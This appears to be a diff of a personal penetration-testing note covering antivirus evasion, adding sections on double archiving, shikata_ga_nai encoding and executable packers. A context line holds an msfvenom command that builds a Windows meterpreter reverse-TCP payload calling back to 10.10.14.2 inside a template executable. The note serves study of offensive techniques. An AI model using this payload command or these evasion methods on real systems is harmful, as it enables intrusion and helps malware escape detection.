@@ -65,9 +65,17 @@ msfvenom window/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/
 
 ## Evading AV detection
 There are many protection mechanisms eg. [[Intrusion Detection]] and AVs. These systems are getting sophisticated and are capable of detecting most *default* payloads. Some mechanisms for evading them are still present as most AVs heavily rely on signature detection.
-
 ### Multi-layered archiving
 Using a tool like [RAR utility](https://www.rarlab.com/download.htm) (WinRAR for linux) we can double archive a payload, making it much harder to get the actual signature of the contents.
-
 ### Using Encoding
-Although t
+Although this is often not enough these days to evade all AVs, it is still a critical step to be used with other techniques. Algorithms like `shikata_ga_nai` with multiple iterations can drastically improve the signature evasion capabilities of a payload.
+### Packers
+This is where the payload is compressed with the executable, to later be decompressed into its original form for execution. MSFVenom also allows you to change the file structure and encrypt the underlying process structure to further complicate the payload's signature.
+- [UPX packer](https://upx.github.io/)
+- [The Enigma Protector](https://enigmaprotector.com/)
+- [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm)
+- Alternate EXE Packer
+- ExeStealth
+- Morphine
+- MEW
+- Themida
